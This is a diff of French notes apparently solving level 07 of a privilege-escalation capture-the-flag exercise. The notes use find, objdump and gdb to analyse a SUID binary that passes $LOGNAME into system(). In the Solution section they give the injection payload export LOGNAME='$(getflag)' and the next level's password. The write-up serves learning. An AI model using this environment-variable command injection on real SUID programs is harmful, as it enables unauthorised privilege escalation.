@@ -6,8 +6,9 @@ LEVEL 07
                  flag07
     find . -perm /u=s,g=s
 
-    find . -type f -user flag07 -o -user flag07
-    find . -type f -user level07 -o -user level07
+    find . -type f -user flag07 -o -user level07
+    find . -maxdepth 1 -name "*string*" -print
+
 
 * Recherches
 
@@ -20,7 +21,7 @@ LEVEL 07
                     
                       Si on run : export LOGNAME=flag07, l'output change bien, en flag07
 
-    objdump -d level06 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'
+    objdump -d level07 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'
 
 
     24 lignes de codes :
@@ -32,10 +33,25 @@ LEVEL 07
         Make breakpoint pending on future shared library load? (y or [n])
 
     Ligne juste avant call asprintf : 22 donc b 22
-    
     Ligne juste avant call system : 23 donc b 23
 
+    Pas + de recherches, en faisant du testing à la volée c'est finalement passé ^^' plutôt gentil ce level
+
 * Solution
+
+    En résumé, on a un binaire SUID flag07
+    ltrace ./level07
+    objdump -d level07 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'
+
+    En assembleur, on constate qu'il y a un call de la fameuse fonction system()
+    Ce call est basé sur le retour de l'appel de asprintf
+    Asprintf est un printf qui renvoie une chaine allouée de ce qui est print (+ safe ainsi), en l'occurence, est print la var d'env $LOGNAME
+
+    Donc en tréfouillant un peu, on arrive à ceci :
+
+    export LOGNAME='$(getflag)' ; ./level07
+
+    su level08 fiumuikeil55xe9cu4dood66h
 
 
 
